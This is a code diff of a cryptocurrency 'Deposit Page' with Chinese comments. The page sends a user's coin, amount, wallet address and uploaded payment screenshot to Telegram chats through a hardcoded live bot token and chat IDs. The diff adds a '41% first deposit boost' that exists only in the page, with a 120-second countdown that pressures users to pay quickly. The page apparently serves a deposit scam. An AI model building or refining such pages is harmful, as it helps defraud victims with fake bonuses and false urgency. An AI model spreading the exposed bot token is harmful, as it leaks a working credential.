@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Deposit Page</title>
+
   <style>
     body { font-family: Arial, sans-serif; background: transparent; color:#fff; margin:0; padding:20px;}
     h1 { text-align:center; margin-bottom:15px; }
@@ -34,9 +35,8 @@
       border-radius:8px;
       padding:10px 12px;
       outline:none;
-      box-sizing:border-box;
       width:100%;
-      backdrop-filter: blur(4px);
+      box-sizing:border-box;
     }
 
     #walletAddressInput {
@@ -55,7 +55,6 @@
       border-radius:8px;
       cursor:pointer;
       font-size:14px;
-      text-align:center;
     }
 
     #uploadedImage{
@@ -79,12 +78,14 @@
       font-size:15px;
     }
 
+    #successMsg{ display:none; text-align:center; color:#00b894; font-weight:bold; margin-top:10px; }
+    #uploadNotice{ color:#f39c12; font-size:12px; }
+
     #submitBtn.loading {
       cursor:not-allowed;
       opacity:0.7;
       position:relative;
     }
-
     #submitBtn.loading::after {
       content:"";
       width:18px;
@@ -98,20 +99,12 @@
       top:50%;
       transform:translateY(-50%);
     }
+    @keyframes spin { from{transform:translateY(-50%) rotate(0);} to{transform:translateY(-50%) rotate(360deg);} }
 
-    @keyframes spin {
-      from { transform:translateY(-50%) rotate(0deg); }
-      to { transform:translateY(-50%) rotate(360deg); }
-    }
-
-    #submitBtn:disabled{
-      opacity:0.5;
-      cursor:not-allowed;
-    }
-
-    #successMsg{ display:none; text-align:center; color:#00b894; font-weight:bold; margin-top:10px; }
-    #uploadNotice{ color:#f39c12; font-size:12px; }
-
+    /* Boost text small gray */
+    .boost-note { font-size:13px; color:#b9b9b9; margin-top:6px; }
+    .boost-expired { font-size:13px; color:#ff6b6b; margin-top:6px; }
+    .boost-timer { color:#00ffea; margin-top:6px; font-weight:600; }
   </style>
 </head>
 <body>
@@ -124,10 +117,18 @@
   </div>
 
   <label for="amountInput">Enter Amount (USDT)</label>
-  <input type="number" id="amountInput" placeholder="0.00">
+  <input type="number" id="amountInput" placeholder="0.00" min="0">
 
   <div id="usdtDisplay">USDT: 0.00</div>
-  <div id="boostDisplay" style="display:none;">First Deposit Boost: +0.00</div>
+
+  <!-- 首次充值 Boost 41% -->
+  <div id="boostDisplay" style="display:none; color:#00ff00; font-weight:600;">First Deposit Boost: +0.00</div>
+
+  <!-- 倒计时区域（灰色提示 + 动态秒数） -->
+  <div id="boostHint" style="display:none;">
+    <div id="boostTimerText" class="boost-note">🤖 请在 <span id="boostSeconds">120</span> 秒内充值，否则无法获得首次充值 41% 奖励</div>
+  </div>
+
   <div id="totalDisplay">Total: 0.00 USDT</div>
 
   <label for="walletAddressInput">Wallet Address</label>
@@ -147,176 +148,254 @@
 <div class="dropdown" id="coinDropdown"></div>
 
 <script>
-// ===== 后端 API 域名（Railway）======
-const API_BASE = "https://crypto-management-production-5e04.up.railway.app";  // 请确保API_URL正确
+/* ========== 初始化变量 ========== */
+const coinDropdown = document.getElementById("coinDropdown");
+const coinSelectBox = document.getElementById("coinSelectBox");
+const coinSelected = document.getElementById("coinSelected");
 
-let coins=[];
-let selectedCoin=null;
+let ws = null;
+let coins = [];
+let selectedCoin = null;
+let currentPrice = 0;
 
-const coinDropdown=document.getElementById("coinDropdown");
-const coinSelectBox=document.getElementById("coinSelectBox");
-const coinSelected=document.getElementById("coinSelected");
+/* 记录首充是否已使用（localStorage） */
+let firstDepositUsed = localStorage.getItem("first_deposit_used") === "1";
 
+/* 倒计时控制 */
+let countdown = 120; // 秒
+let countdownTimer = null;
+
+/* DOM */
+const amountInput = document.getElementById("amountInput");
+const usdtDisplay = document.getElementById("usdtDisplay");
+const boostDisplay = document.getElementById("boostDisplay");
+const totalDisplay = document.getElementById("totalDisplay");
+const boostHint = document.getElementById("boostHint");
+const boostSeconds = document.getElementById("boostSeconds");
+const boostTimerText = document.getElementById("boostTimerText");
+
+const uploadFile = document.getElementById("uploadFile");
+const uploadedImage = document.getElementById("uploadedImage");
+const uploadNotice = document.getElementById("uploadNotice");
+const submitBtn = document.getElementById("submitBtn");
+const successMsg = document.getElementById("successMsg");
+
+/* ========== 获取币种列表（去掉 BCCUSDT） ========== */
 async function fetchCoins(){
   try{
-    const res=await fetch('https://api.binance.com/api/v3/ticker/price');
-    const data=await res.json();
-    coins=data.filter(c=>c.symbol.endsWith('USDT')).map(c=>c.symbol);
+    const res = await fetch('https://api.binance.com/api/v3/ticker/price');
+    const data = await res.json();
+    coins = data
+      .filter(c => c.symbol.endsWith('USDT') && c.symbol !== 'BCCUSDT')
+      .map(c => c.symbol);
     renderDropdown();
-  }catch{
-    coins=["BTCUSDT","ETHUSDT","BNBUSDT"];
+  }catch(err){
+    coins = ["BTCUSDT","ETHUSDT","BNBUSDT"];
     renderDropdown();
   }
 }
 
 function renderDropdown(){
-  coinDropdown.innerHTML="";
-  coins.forEach(c=>{
-    const div=document.createElement("div");
-    const sym=c.replace("USDT","").toLowerCase();
-    const img=document.createElement("img");
-    img.src=`https://cdn.jsdelivr.net/gh/vadimmalykhin/binance-icons/crypto/${sym}.svg`;
-    img.onerror=()=>{img.src="https://via.placeholder.com/24?text=?";};
-    const span=document.createElement("span");
-    span.textContent=c;
+  coinDropdown.innerHTML = "";
+  coins.forEach(c => {
+    const div = document.createElement("div");
+    const img = document.createElement("img");
+    const sym = c.replace("USDT","").toLowerCase();
+    img.src = `https://cdn.jsdelivr.net/gh/vadimmalykhin/binance-icons/crypto/${sym}.svg`;
+    img.onerror = ()=>{ img.src = "https://via.placeholder.com/24?text=?"; };
+
     div.appendChild(img);
-    div.appendChild(span);
-    div.addEventListener("click",()=>{
-      selectedCoin=c;
-      coinSelected.textContent=c;
-      coinDropdown.style.display="none";
-      connectWS(selectedCoin);
+    div.appendChild(document.createTextNode(c));
+    div.onclick = () => {
+      selectedCoin = c;
+      coinSelected.textContent = c;
+      coinDropdown.style.display = "none";
+      connectWS(c);
       updateUSDT();
-    });
+    };
+
     coinDropdown.appendChild(div);
   });
 }
 
-coinSelectBox.addEventListener("click",()=>{
-  const r=coinSelectBox.getBoundingClientRect();
-  coinDropdown.style.top=r.bottom+window.scrollY+"px";
-  coinDropdown.style.left=r.left+window.scrollX+"px";
-  coinDropdown.style.width=r.width+"px";
-  coinDropdown.style.display=coinDropdown.style.display==="block"?"none":"block";
-});
+/* 下拉开关 */
+coinSelectBox.onclick = () => {
+  const r = coinSelectBox.getBoundingClientRect();
+  coinDropdown.style.top = r.bottom + window.scrollY + "px";
+  coinDropdown.style.left = r.left + window.scrollX + "px";
+  coinDropdown.style.width = r.width + "px";
+  coinDropdown.style.display = coinDropdown.style.display === "block" ? "none" : "block";
+};
 
-document.addEventListener("click",e=>{
-  if(!coinSelectBox.contains(e.target)&&!coinDropdown.contains(e.target)){
-    coinDropdown.style.display="none";
+document.addEventListener('click', (e) => {
+  if (!coinSelectBox.contains(e.target) && !coinDropdown.contains(e.target)) {
+    coinDropdown.style.display = "none";
   }
 });
 
-const amountInput=document.getElementById("amountInput");
-const walletAddressInput=document.getElementById("walletAddressInput");
-const usdtDisplay=document.getElementById("usdtDisplay");
-const boostDisplay=document.getElementById("boostDisplay");
-const totalDisplay=document.getElementById("totalDisplay");
-const uploadFile=document.getElementById("uploadFile");
-const uploadedImage=document.getElementById("uploadedImage");
-const uploadNotice=document.getElementById("uploadNotice");
-const submitBtn=document.getElementById("submitBtn");
-const successMsg=document.getElementById("successMsg");
-
-let ws=null;
-let currentPrice=0;
-
+/* WebSocket 实时价 */
 function connectWS(symbol){
-  if(ws)ws.close();
-  ws=new WebSocket(`wss://stream.binance.com:9443/ws/${symbol.toLowerCase()}@ticker`);
-  ws.onmessage=msg=>{
-    const d=JSON.parse(msg.data);
-    currentPrice=parseFloat(d.c);
+  try{ if(ws) ws.close(); }catch(e){}
+  ws = new WebSocket(`wss://stream.binance.com:9443/ws/${symbol.toLowerCase()}@ticker`);
+  ws.onmessage = e => {
+    const d = JSON.parse(e.data);
+    currentPrice = parseFloat(d.c || 0);
     updateUSDT();
   };
 }
 
-function updateUSDT(){
-  const amount=parseFloat(amountInput.value)||0;
-  const usdt=amount*currentPrice;
-  const boost=amount>0?usdt*0.41:0;
+/* ========== 倒计时逻辑 ========== */
+function startCountdownIfNeeded(){
+  // 如果已使用过首充或倒计时已开始，跳过
+  if(firstDepositUsed || countdownTimer) return;
 
-  usdtDisplay.textContent=`USDT: ${usdt.toFixed(2)}`;
-  if(boost>0){
-    boostDisplay.style.display="block";
-    boostDisplay.textContent=`First Deposit Boost: +${boost.toFixed(2)}`;
-  }else boostDisplay.style.display="none";
+  // 仅在用户输入金额并且金额 > 0 时才启动倒计时
+  if((parseFloat(amountInput.value) || 0) <= 0) return;
 
-  totalDisplay.textContent=`Total: ${(usdt+boost).toFixed(2)} USDT`;
+  countdown = 120;
+  boostHint.style.display = "block";
+  boostSeconds.textContent = countdown;
+  boostTimerText.className = "boost-note";
+
+  countdownTimer = setInterval(()=>{
+    countdown--;
+    boostSeconds.textContent = countdown;
+
+    if(countdown <= 0){
+      clearInterval(countdownTimer);
+      countdownTimer = null;
+      // 标记为已使用（过期也算）
+      firstDepositUsed = true;
+      localStorage.setItem("first_deposit_used","1");
+      // 隐藏 boost 显示过期提示（红色）
+      boostDisplay.style.display = "none";
+      boostHint.style.display = "block";
+      boostTimerText.textContent = "⛔ More than 120 seconds have passed, and the 41% bonus for the first recharge cannot be obtained.";
+      boostTimerText.className = "boost-expired";
+      updateUSDT();
+    }
+  }, 1000);
 }
 
-amountInput.addEventListener("input",updateUSDT);
+/* ========== 计算与显示 ========== */
+amountInput.addEventListener('input', () => {
+  updateUSDT();
+  // 尝试启动倒计时（第一次有效输入会触发）
+  startCountdownIfNeeded();
+});
 
-uploadFile.addEventListener("change",()=>{
-  const f=uploadFile.files[0];
+function updateUSDT(){
+  const amount = parseFloat(amountInput.value) || 0;
+  const usdt = amount * currentPrice;
+  usdtDisplay.textContent = `USDT: ${usdt.toFixed(2)}`;
+
+  let boost = 0;
+  // 仅当首充未使用且倒计时未结束时显示 boost
+  if(!firstDepositUsed && amount > 0 && (countdown > 0 || countdownTimer)){
+    boost = usdt * 0.41;
+    boostDisplay.style.display = "block";
+    boostDisplay.textContent = `First Deposit Boost: +${boost.toFixed(2)}`;
+
+    // 显示灰色提示（倒计时会在 startCountdownIfNeeded 中启动）
+    if(!countdownTimer) startCountdownIfNeeded();
+    // ensure hint displays with current seconds
+    boostHint.style.display = "block";
+    boostSeconds.textContent = countdown > 0 ? countdown : 0;
+    boostTimerText.className = "boost-note";
+    boostTimerText.textContent = `🤖 Please recharge within ${countdown} seconds, otherwise you will not be able to receive the 41% bonus on your first recharge.`;
+  } else {
+    boostDisplay.style.display = "none";
+    // 如果首充已使用，显示过期灰色提示（或隐藏）
+    if(firstDepositUsed){
+      boostHint.style.display = "block";
+      boostTimerText.textContent = "⛔ The 41% bonus for first recharge has been used or expired.";
+      boostTimerText.className = "boost-expired";
+    } else {
+      boostHint.style.display = "none";
+    }
+  }
+
+  totalDisplay.textContent = `Total: ${(usdt + boost).toFixed(2)} USDT`;
+}
+
+/* ========== 上传与提交 ========== */
+uploadFile.onchange = function(){
+  const f = this.files[0];
   if(f){
-    const r=new FileReader();
-    r.onload=e=>{
-      uploadedImage.src=e.target.result;
-      uploadedImage.style.display="block";
-      uploadNotice.style.display="none";
-      submitBtn.disabled=false;
+    const r = new FileReader();
+    r.onload = e => {
+      uploadedImage.src = e.target.result;
+      uploadedImage.style.display = "block";
+      uploadNotice.style.display = "none";
+      submitBtn.disabled = false;
     };
     r.readAsDataURL(f);
   }
-});
+};
 
-submitBtn.addEventListener("click",async ()=>{
-  if(!walletAddressInput.value || !selectedCoin || !amountInput.value || !uploadFile.files[0]){
-    alert("Please fill all required fields!");
+submitBtn.onclick = async () => {
+  if(!selectedCoin || !amountInput.value || !document.getElementById('walletAddressInput').value || !uploadFile.files[0]){
+    alert("Please fill all fields");
     return;
   }
 
-  // Disable submit button and inputs during submission
-  submitBtn.disabled=true;
+  // 提交时，如果是首充且倒计时还在或尚未开始但未被标记，则标记为已使用（避免二次得boost）
+  if(!firstDepositUsed){
+    firstDepositUsed = true;
+    localStorage.setItem("first_deposit_used","1");
+  }
+
+  submitBtn.disabled = true;
   submitBtn.classList.add("loading");
-  submitBtn.textContent="Submitting...";
+  submitBtn.textContent = "Submitting...";
 
-  walletAddressInput.disabled=true;
-  amountInput.disabled=true;
-  coinSelectBox.style.pointerEvents="none";
-  uploadLabel.style.pointerEvents="none";
+  const message = 
+`💰 New Deposit Submission
 
-  const message=`New Deposit Submission:
 Coin: ${selectedCoin}
 Amount: ${amountInput.value} USDT
-Wallet: ${walletAddressInput.value}`;
+Wallet: ${document.getElementById('walletAddressInput').value}`;
 
   await sendTelegram(message, uploadFile.files[0]);
 
-  successMsg.style.display="block";
-  submitBtn.textContent="Submitted";
+  successMsg.style.display = "block";
+  submitBtn.textContent = "Submitted";
   submitBtn.classList.remove("loading");
-  submitBtn.style.background="#555";
-});
+  submitBtn.style.background = "#555";
+};
 
-// Send message to Telegram
+/* ========== Telegram 发送（保留你原 Token & IDs） ========== */
 async function sendTelegram(text, imageFile){
-  const botToken = "YOUR_BOT_TOKEN";
+  const botToken = "8528337731:AAGb6D_TRPKYSQrxA7s4TAizsPjNqnajhrU";
+
   const chatIds = [
-    "YOUR_USER_CHAT_ID",      // Personal
-    "-100YOUR_GROUP_CHAT_ID"  // Group
+    "6062973135",
+    "-1003329204481"
   ];
 
   for(const chatId of chatIds){
-    // Send text message
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({chat_id: chatId, text})
-    });
+    try{
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({ chat_id:chatId, text })
+      });
 
-    // Send image
-    const formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("photo", imageFile);
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", imageFile);
 
-    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      method: "POST",
-      body: formData
-    });
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{
+        method:"POST",
+        body: formData
+      });
+    }catch(e){
+      console.warn("Telegram send failed for", chatId, e);
+    }
   }
 }
 
+/* ========== 初始化 ========== */
 fetchCoins();
 </script>
 
